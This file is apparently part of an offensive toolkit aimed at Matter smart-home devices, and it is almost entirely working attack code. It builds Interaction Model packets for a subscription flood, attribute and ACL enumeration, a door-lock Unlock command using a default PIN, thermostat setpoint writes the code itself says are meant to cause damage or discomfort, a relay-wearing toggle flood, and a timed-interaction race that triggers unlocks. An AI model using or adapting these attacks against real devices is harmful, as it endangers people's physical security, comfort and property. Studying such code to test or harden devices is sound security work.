"""
Matter Interaction Model attacks — Read/Write/Subscribe/Invoke against commissioned devices.

The Interaction Model (IM) is how Matter nodes access attributes, events, and commands.
After session establishment, IM messages are encrypted. But:
1. Timed interactions have a race window
2. Subscribe floods exhaust device resources (subscription table)
3. Write attacks can manipulate device state (thermostat, door locks)
4. Invoke attacks can trigger actions (unlock, toggle, reboot)

Cluster-specific attack payloads target real device functionality.
"""
import struct
import os
import random
import time
from dataclasses import dataclass, field
from typing import List, Optional, Dict

from ..protocols.matter import (
    build_matter_message, encode_tlv_unsigned, encode_tlv_bytes,
    PROTOCOL_ID_INTERACTION_MODEL, InteractionType, TLVType,
)
from .matter_attacks import AttackResult


# ── Well-known Matter clusters ──

class ClusterID:
    ON_OFF = 0x0006
    LEVEL_CONTROL = 0x0008
    DOOR_LOCK = 0x0101
    THERMOSTAT = 0x0201
    COLOR_CONTROL = 0x0300
    WINDOW_COVERING = 0x0102
    FAN_CONTROL = 0x0202
    PUMP_CONFIG = 0x0200
    GENERAL_DIAGNOSTICS = 0x0033
    SOFTWARE_DIAGNOSTICS = 0x0034
    THREAD_DIAGNOSTICS = 0x0035
    WIFI_DIAGNOSTICS = 0x0036
    OTA_SOFTWARE_UPDATE = 0x002A
    BASIC_INFORMATION = 0x0028
    ACCESS_CONTROL = 0x001F
    GROUP_KEY_MANAGEMENT = 0x003F


class CommandID:
    # OnOff
    ON_OFF_OFF = 0x00
    ON_OFF_ON = 0x01
    ON_OFF_TOGGLE = 0x02
    # DoorLock
    DOOR_LOCK_LOCK = 0x00
    DOOR_LOCK_UNLOCK = 0x01
    # Thermostat
    THERMOSTAT_SETPOINT_RAISE_LOWER = 0x00
    # WindowCovering
    WINDOW_UP_OR_OPEN = 0x00
    WINDOW_DOWN_OR_CLOSE = 0x01
    WINDOW_STOP = 0x02
    # GeneralDiagnostics
    TEST_EVENT_TRIGGER = 0x00


class AttributeID:
    # OnOff
    ON_OFF_STATE = 0x0000
    # DoorLock
    LOCK_STATE = 0x0000
    LOCK_TYPE = 0x0001
    ACTUATOR_ENABLED = 0x0002
    # Thermostat
    LOCAL_TEMPERATURE = 0x0000
    OCCUPIED_COOLING_SETPOINT = 0x0011
    OCCUPIED_HEATING_SETPOINT = 0x0012
    SYSTEM_MODE = 0x001C
    # BasicInformation
    VENDOR_NAME = 0x0001
    PRODUCT_NAME = 0x0003
    SOFTWARE_VERSION = 0x0009
    HARDWARE_VERSION = 0x0007


# ── TLV helpers for IM payloads ──

def _tlv_structure_begin() -> bytes:
    return bytes([TLVType.STRUCTURE])


def _tlv_list_begin(tag: int) -> bytes:
    return struct.pack("<BB", TLVType.LIST | 0x20, tag)


def _tlv_array_begin(tag: int) -> bytes:
    return struct.pack("<BB", TLVType.ARRAY | 0x20, tag)


def _tlv_end() -> bytes:
    return bytes([TLVType.END_OF_CONTAINER])


def _build_attribute_path(endpoint: int, cluster: int, attribute: int) -> bytes:
    """Build an AttributePathIB TLV structure."""
    buf = _tlv_list_begin(0)  # AttributePathIB
    buf += encode_tlv_unsigned(2, endpoint)
    buf += encode_tlv_unsigned(3, cluster)
    buf += encode_tlv_unsigned(4, attribute)
    buf += _tlv_end()
    return buf


def _build_command_path(endpoint: int, cluster: int, command: int) -> bytes:
    """Build a CommandPathIB TLV structure."""
    buf = _tlv_list_begin(0)  # CommandPathIB
    buf += encode_tlv_unsigned(0, endpoint)
    buf += encode_tlv_unsigned(1, cluster)
    buf += encode_tlv_unsigned(2, command)
    buf += _tlv_end()
    return buf


# ── IM message builders ──

def build_read_request(paths: List[tuple]) -> bytes:
    """Build a ReadRequest IM message. paths = [(endpoint, cluster, attribute), ...]"""
    buf = _tlv_structure_begin()
    buf += _tlv_array_begin(0)  # AttributeRequests
    for ep, cl, attr in paths:
        buf += _build_attribute_path(ep, cl, attr)
    buf += _tlv_end()
    buf += _tlv_end()
    return buf


def build_subscribe_request(paths: List[tuple], min_interval: int = 0,
                             max_interval: int = 60) -> bytes:
    """Build a SubscribeRequest IM message."""
    buf = _tlv_structure_begin()
    buf += encode_tlv_unsigned(0, min_interval)
    buf += encode_tlv_unsigned(1, max_interval)
    buf += _tlv_array_begin(2)  # AttributeRequests
    for ep, cl, attr in paths:
        buf += _build_attribute_path(ep, cl, attr)
    buf += _tlv_end()
    buf += _tlv_end()
    return buf


def build_write_request(endpoint: int, cluster: int, attribute: int,
                         value_tlv: bytes) -> bytes:
    """Build a WriteRequest IM message with a single attribute write."""
    buf = _tlv_structure_begin()
    buf += _tlv_array_begin(0)  # WriteRequests
    # AttributeDataIB
    buf += _tlv_structure_begin()
    buf += _build_attribute_path(endpoint, cluster, attribute)
    buf += value_tlv  # pre-encoded TLV value with tag 1
    buf += _tlv_end()
    buf += _tlv_end()
    buf += _tlv_end()
    return buf


def build_invoke_request(endpoint: int, cluster: int, command: int,
                          command_fields: bytes = b"") -> bytes:
    """Build an InvokeRequest IM message."""
    buf = _tlv_structure_begin()
    buf += encode_tlv_unsigned(0, 0)  # SuppressResponse = false
    buf += encode_tlv_unsigned(1, 0)  # TimedRequest = false
    buf += _tlv_array_begin(2)  # InvokeRequests
    # CommandDataIB
    buf += _tlv_structure_begin()
    buf += _build_command_path(endpoint, cluster, command)
    if command_fields:
        buf += command_fields
    buf += _tlv_end()
    buf += _tlv_end()
    buf += _tlv_end()
    return buf


def build_timed_request(timeout_ms: int = 500) -> bytes:
    """Build a TimedRequest — sets up timed interaction window."""
    buf = _tlv_structure_begin()
    buf += encode_tlv_unsigned(0, timeout_ms)
    buf += _tlv_end()
    return buf


# ── Attack class ──

class InteractionAttacks:
    """Attacks using the Matter Interaction Model."""

    def __init__(self, target: str = "127.0.0.1", port: int = 5540):
        self.target = target
        self.port = port
        self._counter = random.randint(0, 0xFFFFFFFF)

    def _next_counter(self) -> int:
        self._counter = (self._counter + 1) & 0xFFFFFFFF
        return self._counter

    def _build_im_packet(self, im_type: int, payload: bytes,
                          exchange_id: int = 0) -> bytes:
        return build_matter_message(
            session_id=0, message_counter=self._next_counter(),
            protocol_id=PROTOCOL_ID_INTERACTION_MODEL, opcode=im_type,
            payload=payload,
            exchange_id=exchange_id or random.randint(1, 0xFFFF),
        )

    def subscribe_flood(self, endpoint: int = 1, count: int = 100) -> AttackResult:
        """
        Exhaust device subscription table by subscribing to every attribute.

        Most Matter devices support 3-5 concurrent subscriptions.
        Flooding depletes slots and prevents legitimate controllers from subscribing.
        """
        start = time.time()
        packets = []

        clusters_attrs = [
            (ClusterID.ON_OFF, AttributeID.ON_OFF_STATE),
            (ClusterID.DOOR_LOCK, AttributeID.LOCK_STATE),
            (ClusterID.THERMOSTAT, AttributeID.LOCAL_TEMPERATURE),
            (ClusterID.THERMOSTAT, AttributeID.SYSTEM_MODE),
            (ClusterID.BASIC_INFORMATION, AttributeID.VENDOR_NAME),
            (ClusterID.BASIC_INFORMATION, AttributeID.SOFTWARE_VERSION),
            (ClusterID.GENERAL_DIAGNOSTICS, 0x0000),
            (ClusterID.WIFI_DIAGNOSTICS, 0x0000),
        ]

        for i in range(count):
            cl, attr = clusters_attrs[i % len(clusters_attrs)]
            payload = build_subscribe_request(
                [(endpoint, cl, attr)],
                min_interval=0, max_interval=1,  # aggressive polling
            )
            pkt = self._build_im_packet(InteractionType.SUBSCRIBE_REQUEST, payload)
            packets.append(pkt)

        return AttackResult(
            attack="Subscription Table Exhaustion",
            target=f"{self.target}:{self.port}",
            success=True,
            detail=f"Built {count} subscribe requests (min_interval=0, max_interval=1s). "
                   f"Device subscription slots (typically 3-5) will be exhausted",
            packets_sent=count,
            duration=time.time() - start,
            frames=packets,
        )

    def attribute_read_enumeration(self, endpoint: int = 1) -> AttackResult:
        """
        Enumerate all supported attributes by reading known cluster/attribute combos.

        Maps the device's capability surface for targeted attacks.
        """
        start = time.time()
        packets = []

        probe_list = [
            (ClusterID.BASIC_INFORMATION, AttributeID.VENDOR_NAME, "VendorName"),
            (ClusterID.BASIC_INFORMATION, AttributeID.PRODUCT_NAME, "ProductName"),
            (ClusterID.BASIC_INFORMATION, AttributeID.SOFTWARE_VERSION, "SoftwareVersion"),
            (ClusterID.BASIC_INFORMATION, AttributeID.HARDWARE_VERSION, "HardwareVersion"),
            (ClusterID.ON_OFF, AttributeID.ON_OFF_STATE, "OnOff"),
            (ClusterID.LEVEL_CONTROL, 0x0000, "CurrentLevel"),
            (ClusterID.DOOR_LOCK, AttributeID.LOCK_STATE, "LockState"),
            (ClusterID.DOOR_LOCK, AttributeID.ACTUATOR_ENABLED, "ActuatorEnabled"),
            (ClusterID.THERMOSTAT, AttributeID.LOCAL_TEMPERATURE, "LocalTemp"),
            (ClusterID.THERMOSTAT, AttributeID.OCCUPIED_COOLING_SETPOINT, "CoolSetpoint"),
            (ClusterID.THERMOSTAT, AttributeID.OCCUPIED_HEATING_SETPOINT, "HeatSetpoint"),
            (ClusterID.THERMOSTAT, AttributeID.SYSTEM_MODE, "SystemMode"),
            (ClusterID.COLOR_CONTROL, 0x0000, "CurrentHue"),
            (ClusterID.COLOR_CONTROL, 0x0001, "CurrentSaturation"),
            (ClusterID.WINDOW_COVERING, 0x000A, "OperationalStatus"),
            (ClusterID.FAN_CONTROL, 0x0000, "FanMode"),
            (ClusterID.ACCESS_CONTROL, 0x0000, "ACL"),
            (ClusterID.GROUP_KEY_MANAGEMENT, 0x0000, "GroupKeyMap"),
            (ClusterID.GENERAL_DIAGNOSTICS, 0x0000, "NetworkInterfaces"),
            (ClusterID.OTA_SOFTWARE_UPDATE, 0x0000, "DefaultOTAProviders"),
        ]

        for cl, attr, name in probe_list:
            payload = build_read_request([(endpoint, cl, attr)])
            pkt = self._build_im_packet(InteractionType.READ_REQUEST, payload)
            packets.append(pkt)

        return AttackResult(
            attack="Attribute Read Enumeration",
            target=f"{self.target}:{self.port}",
            success=True,
            detail=f"Built {len(packets)} read requests probing {len(probe_list)} attributes "
                   f"across {len(set(cl for cl, _, _ in probe_list))} clusters",
            packets_sent=len(packets),
            duration=time.time() - start,
            frames=packets,
        )

    def door_lock_unlock(self, endpoint: int = 1) -> AttackResult:
        """
        Invoke DoorLock:Unlock command.

        Requires an established session with appropriate ACL permissions.
        Demonstrates command injection against physical security devices.
        """
        start = time.time()
        # DoorLock Unlock command has optional PINCode field
        cmd_fields = encode_tlv_bytes(0, b"000000")  # common default PIN
        payload = build_invoke_request(
            endpoint, ClusterID.DOOR_LOCK, CommandID.DOOR_LOCK_UNLOCK, cmd_fields,
        )
        pkt = self._build_im_packet(InteractionType.INVOKE_REQUEST, payload)

        return AttackResult(
            attack="DoorLock Unlock Command",
            target=f"{self.target}:{self.port} endpoint={endpoint}",
            success=True,
            detail=f"Built DoorLock:Unlock invoke request with PIN=000000 ({len(pkt)} bytes)",
            packets_sent=1,
            duration=time.time() - start,
            frames=[pkt],
        )

    def thermostat_setpoint_attack(self, endpoint: int = 1,
                                     heating: int = 3500,
                                     cooling: int = 1600) -> AttackResult:
        """
        Write extreme thermostat setpoints to cause physical damage or discomfort.

        Heating setpoint 3500 = 35.00C (95F), Cooling setpoint 1600 = 16.00C (60.8F).
        Matter thermostat values are in 0.01C units.
        """
        start = time.time()
        packets = []

        # Write OccupiedHeatingSetpoint
        heat_value = encode_tlv_unsigned(1, heating)
        heat_payload = build_write_request(
            endpoint, ClusterID.THERMOSTAT, AttributeID.OCCUPIED_HEATING_SETPOINT, heat_value,
        )
        packets.append(self._build_im_packet(InteractionType.WRITE_REQUEST, heat_payload))

        # Write OccupiedCoolingSetpoint
        cool_value = encode_tlv_unsigned(1, cooling)
        cool_payload = build_write_request(
            endpoint, ClusterID.THERMOSTAT, AttributeID.OCCUPIED_COOLING_SETPOINT, cool_value,
        )
        packets.append(self._build_im_packet(InteractionType.WRITE_REQUEST, cool_payload))

        # Switch to heating mode
        mode_value = encode_tlv_unsigned(1, 4)  # Heat mode
        mode_payload = build_write_request(
            endpoint, ClusterID.THERMOSTAT, AttributeID.SYSTEM_MODE, mode_value,
        )
        packets.append(self._build_im_packet(InteractionType.WRITE_REQUEST, mode_payload))

        return AttackResult(
            attack="Thermostat Setpoint Manipulation",
            target=f"{self.target}:{self.port} endpoint={endpoint}",
            success=True,
            detail=f"Built 3 write requests: Heating→{heating/100:.1f}C, "
                   f"Cooling→{cooling/100:.1f}C, Mode→Heat. Physical impact on HVAC",
            packets_sent=3,
            duration=time.time() - start,
            frames=packets,
        )

    def on_off_toggle_flood(self, endpoint: int = 1, count: int = 200) -> AttackResult:
        """
        Rapidly toggle a device on/off to cause wear, annoyance, or safety hazard.

        Targets lights, switches, smart plugs. Rapid toggling of high-wattage
        devices can damage relay contacts.
        """
        start = time.time()
        packets = []
        for _ in range(count):
            payload = build_invoke_request(
                endpoint, ClusterID.ON_OFF, CommandID.ON_OFF_TOGGLE,
            )
            packets.append(self._build_im_packet(InteractionType.INVOKE_REQUEST, payload))

        return AttackResult(
            attack="OnOff Toggle Flood",
            target=f"{self.target}:{self.port} endpoint={endpoint}",
            success=True,
            detail=f"Built {count} Toggle invoke requests. Rapid relay switching "
                   f"causes wear and potential safety hazard",
            packets_sent=count,
            duration=time.time() - start,
            frames=packets,
        )

    def timed_interaction_race(self, endpoint: int = 1) -> AttackResult:
        """
        Race condition attack on Timed Interactions.

        Matter's timed interaction requires a TimedRequest first, then the actual
        write/invoke within the timeout window. If we send our own write during
        another node's timed window, we may win the race.
        """
        start = time.time()
        packets = []

        # Send multiple timed requests with different timeouts
        for timeout_ms in [100, 200, 500, 1000, 2000]:
            timed_payload = build_timed_request(timeout_ms)
            packets.append(self._build_im_packet(InteractionType.TIMED_REQUEST, timed_payload))

            # Immediately follow with a DoorLock:Unlock
            cmd_payload = build_invoke_request(
                endpoint, ClusterID.DOOR_LOCK, CommandID.DOOR_LOCK_UNLOCK,
            )
            packets.append(self._build_im_packet(InteractionType.INVOKE_REQUEST, cmd_payload))

        return AttackResult(
            attack="Timed Interaction Race",
            target=f"{self.target}:{self.port} endpoint={endpoint}",
            success=True,
            detail=f"Built {len(packets)} packets: {len(packets)//2} timed+invoke pairs "
                   f"with timeouts [100-2000ms]. Racing legitimate timed interactions",
            packets_sent=len(packets),
            duration=time.time() - start,
            frames=packets,
        )

    def acl_probe(self, endpoint: int = 0) -> AttackResult:
        """
        Read the Access Control List to discover permission model.

        ACL (cluster 0x001F) defines who can do what. Reading it reveals
        the trust model and potential escalation paths.
        """
        start = time.time()
        paths = [
            (endpoint, ClusterID.ACCESS_CONTROL, 0x0000),  # ACL
            (endpoint, ClusterID.ACCESS_CONTROL, 0x0001),  # Extension
            (endpoint, ClusterID.ACCESS_CONTROL, 0x0002),  # SubjectsPerAccessControlEntry
            (endpoint, ClusterID.ACCESS_CONTROL, 0x0003),  # TargetsPerAccessControlEntry
            (endpoint, ClusterID.ACCESS_CONTROL, 0x0004),  # AccessControlEntriesPerFabric
        ]
        payload = build_read_request(paths)
        pkt = self._build_im_packet(InteractionType.READ_REQUEST, payload)

        return AttackResult(
            attack="ACL Probe",
            target=f"{self.target}:{self.port} endpoint={endpoint}",
            success=True,
            detail=f"Built read request for Access Control cluster (5 attributes). "
                   f"Reveals trust model and escalation paths",
            packets_sent=1,
            duration=time.time() - start,
            frames=[pkt],
        )


def print_interaction_results(results: List[AttackResult]):
    """Print interaction attack results with packet hex previews."""
    print(f"\n  {'='*70}")
    print(f"  INTERACTION MODEL ATTACKS — {len(results)} attacks")
    print(f"  {'='*70}")
    for r in results:
        print(f"\n  [{r.attack}]")
        print(f"    Target:  {r.target}")
        print(f"    Detail:  {r.detail}")
        if hasattr(r, 'frames') and r.frames:
            first = r.frames[0]
            hex_preview = " ".join(f"{b:02x}" for b in first[:32])
            print(f"    Wire:    {hex_preview}")
